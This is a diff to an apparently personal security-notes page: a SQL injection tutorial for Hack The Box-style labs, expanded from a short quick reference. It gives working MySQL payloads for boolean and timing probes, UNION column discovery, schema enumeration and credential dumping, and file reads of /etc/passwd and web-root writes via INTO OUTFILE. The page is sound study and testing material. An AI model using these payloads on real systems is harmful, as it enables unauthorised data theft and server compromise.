@@ -1,11 +1,213 @@
 ---
-title: "SQL Injection: Manual Quick Reference"
+title: "SQL Injection"
 sidebarTitle: "SQL injection"
-description: "Review manual probes, UNION column discovery, MySQL data extraction, and the privilege requirements for file access."
+description: "Confirm query context, find UNION columns, enumerate MySQL, and diagnose file-access prerequisites."
 keywords: ["sql injection", "sqli", "union select", "boolean probe", "information_schema", "load_file", "into outfile"]
 ---
 
 {/* Generated from Web/SQL Injection.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Look for inputs used to retrieve or filter database records: search terms, item IDs, categories, sort controls, and login fields. A useful test changes the meaning of the database query, not just the text shown on the page. The worked payloads below use MySQL and a quoted string input; establish that context before adapting them.
+
+## From a parameter to a confirmed finding
+
+1. Save a normal request and a known-empty result.
+2. Test one parameter at a time, retaining authentication and any CSRF token.
+3. Compare a quote/syntax test and a true/false pair against the baseline.
+4. Identify whether results are visible, errors expose details, or only a boolean/timing difference is available.
+5. For UNION output, establish column count and a visible compatible column.
+6. Enumerate the current database, its relevant tables and columns, then the specific data the lab asks for.
+
+## Preserve the request and compare responses
+
+```bash
+BASE='http://app.htb'
+curl -sS -G --data-urlencode 'port_code=cn' \
+  "$BASE/search.php" -o baseline.html
+curl -sS -G --data-urlencode "port_code=cn'" \
+  "$BASE/search.php" -o quote.html
+diff -u baseline.html quote.html
+```
+
+`--data-urlencode` sends quotes, spaces, and comment characters as part of the intended value. Inspect status, redirects, body, and any query error. A generic 500 response by itself does not establish SQL injection.
+
+These examples are values for a **quoted** input:
+
+```sql
+cn' AND 1=1-- -
+cn' AND 1=2-- -
+```
+
+For a genuinely unquoted numeric value, the opening quote may be unnecessary:
+
+```sql
+1 AND 1=1
+1 AND 1=2
+```
+
+A true condition that retains results and a false condition that removes them is useful evidence when repeated under the same session and response conditions. Compare actual page content rather than only byte length if timestamps or tokens vary.
+
+## Reconstruct the query boundary
+
+This illustrative query explains why quoting and the remaining suffix matter:
+
+```sql
+SELECT * FROM logins WHERE username='INPUT' AND password='VALUE';
+```
+
+```text
+admin'-- -
+admin')-- -
+```
+
+The first value closes a string; the second additionally closes a parenthesis. Choose based on evidence from the query or errors, not at random. In MySQL, `--` needs following whitespace; `-- -` makes that whitespace visible in saved notes. A literal `#` placed in a browser URL is a fragment unless encoded, so it may never reach the server.
+
+For a login exercise, evaluate the full boolean expression. `AND` and `OR` precedence, parentheses, and the application's handling of returned rows affect the result. An accepted login proves a specific authentication consequence, not arbitrary OS execution.
+
+## Determine columns for UNION output
+
+### Column count with ORDER BY
+
+Increase the position until the query reports an invalid sort position, then narrow the boundary.
+
+```sql
+cn' ORDER BY 1-- -
+cn' ORDER BY 2-- -
+cn' ORDER BY 4-- -
+cn' ORDER BY 5-- -
+```
+
+If position 4 works and 5 fails consistently, four selected columns are plausible. If all responses look identical, errors may be suppressed or the injection context may be wrong; use the UNION method rather than assuming a count.
+
+### Match the count and compatible types
+
+```sql
+cn' UNION SELECT NULL-- -
+cn' UNION SELECT NULL,NULL-- -
+cn' UNION SELECT NULL,NULL,NULL,NULL-- -
+```
+
+`UNION` requires the same number of columns. `NULL` is useful while testing compatibility. Once the four-column form works, put recognizable values in the positions:
+
+```sql
+cn' UNION SELECT 1,2,3,4-- -
+cn' UNION SELECT 1,'visible-marker',3,4-- -
+```
+
+Record which positions the application displays. If only the first original row is rendered, use a valid but nonmatching original search value so the injected row can become visible. Do not confuse “query accepted” with “output rendered.”
+
+## Fingerprint and enumerate MySQL
+
+The following assumes four columns with position 2 visible and able to display text. Change the column layout to your proven context.
+
+```sql
+cn' UNION SELECT 1,@@version,3,4-- -
+cn' UNION SELECT 1,database(),3,4-- -
+cn' UNION SELECT 1,user(),3,4-- -
+cn' UNION SELECT 1,current_user(),3,4-- -
+```
+
+Record the DBMS/version, selected schema, and effective database identity. A database user is not necessarily the operating-system account serving the web application.
+
+### Schemas → tables → columns → rows
+
+```sql
+cn' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -
+```
+
+Select a relevant schema instead of immediately dumping everything:
+
+```sql
+cn' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='dev'-- -
+```
+
+Filter columns by both schema and table; another schema can contain a table with the same name.
+
+```sql
+cn' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_schema='dev' AND table_name='credentials'-- -
+```
+
+Query the confirmed column names with the schema explicitly qualified:
+
+```sql
+cn' UNION SELECT 1,concat(username,':',password),3,4 FROM dev.credentials-- -
+cn' UNION SELECT 1,concat(username,':',password),3,4 FROM dev.credentials LIMIT 0,1-- -
+cn' UNION SELECT 1,concat(username,':',password),3,4 FROM dev.credentials LIMIT 1,1-- -
+```
+
+Use bounded results if the page truncates output. If a value is `NULL`, `CONCAT` may return `NULL`; retrieve columns separately or handle that value explicitly. These queries assume the columns really are named `username` and `password`.
+
+## When no UNION output appears
+
+| Channel | What to establish | Next step |
+| --- | --- | --- |
+| Boolean | A repeatable true/false response difference | Use that comparison as the extraction channel |
+| Error | A controlled expression produces useful DBMS-specific information | Confirm DBMS and error context |
+| Time | A conditional delay repeats against a stable baseline | Check network variance and server execution behavior |
+| None | Request/session/context may still be wrong | Return to the normal request before automating |
+
+```sql
+1 AND IF(1=1,SLEEP(3),0)
+1 AND IF(1=2,SLEEP(3),0)
+```
+
+These are MySQL numeric-context timing examples. Do not use them as a universal payload; the query may evaluate the expression multiple times. Use [SQLMap's request and comparison workflow](/web/sqlmap) once you can explain the request and suspected channel.
+
+## File access is a separate privilege check
+
+A successful UNION query does not imply file privileges. Inspect the database identity and available privilege information first.
+
+```sql
+cn' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges-- -
+```
+
+If you have a direct SQL prompt, inspect the setting using:
+
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+
+For MySQL, a directory value restricts applicable file operations to that directory; an empty value does not impose that directory restriction; `NULL` disables the affected import/export operations. The database account still needs the appropriate privilege and the database server's OS account must have filesystem access. The setting and metadata access vary between DBMS products/versions. See the [MySQL secure_file_priv reference](https://dev.mysql.com/doc/refman/8.4/en/server-system-variables.html#sysvar_secure_file_priv).
+
+### Read a known file
+
+```sql
+cn' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
+cn' UNION SELECT 1,LOAD_FILE('/var/www/html/search.php'),3,4-- -
+```
+
+Use an evidenced absolute path. A `NULL` result can mean missing privilege, an unreadable or nonexistent file, a setting restriction, or a size constraint. Reading application source can reveal the real query and configuration; preserve it as evidence.
+
+### Prove write access before assuming execution
+
+```sql
+cn' UNION SELECT 1,'sql-write-proof',3,4 INTO OUTFILE '/var/www/html/sql-proof.txt'-- -
+```
+
+```bash
+curl -sS "$BASE/sql-proof.txt"
+```
+
+This requires a writable, correctly identified web directory. `INTO OUTFILE` does not overwrite an existing file. A successful retrieval establishes a write/read relationship; PHP execution additionally requires a PHP handler for that path. A database server on another host will not write into the web host merely because a path looks familiar.
+
+## Common failure patterns
+
+| Symptom | Check |
+| --- | --- |
+| Every quote gives a generic error | Whether input reaches SQL, the actual string delimiter, and error suppression |
+| ORDER BY count works, UNION fails | Column types, suffix/parentheses, and whether the original query supports the attempted UNION |
+| UNION is accepted, nothing displayed | Visible column, original rows, output truncation, and application rendering |
+| Table exists but query fails | Correct schema qualification, case behavior, account privileges, and actual column names |
+| `LOAD_FILE` returns NULL | File path, OS readability, database privilege, and restrictions |
+| sqlmap reports something different | Compare its exact request with the successful manual request |
+
+Keep the baseline, paired proof, query shape, column layout, DBMS, and successful enumeration sequence. Prevention centers on parameterized queries and least-privileged database access, not a blacklist of quote characters.
+
+Source: your [SQL Injection Fundamentals capture](/web/htb/sql-injection-fundamentals). The operational sequence above is the main reference; the capture retains the original longer lesson and transcripts.
+
+## Earlier notebook reference
+
+The original shorthand is retained below. Use the context, prerequisites, and corrections above when applying these examples.
 
 Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
@@ -42,3 +244,11 @@ Injection into a SQL query. Confirm with a boolean/error probe, find the column 
 
 
 See [SQLmap](/web/sqlmap) to automate detection and extraction.
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [SQL Injection Fundamentals — full HTB module](/web/htb/sql-injection-fundamentals) — Original lesson capture with the longer transcripts.
+
+{/* VAULT_RELATED_END */}
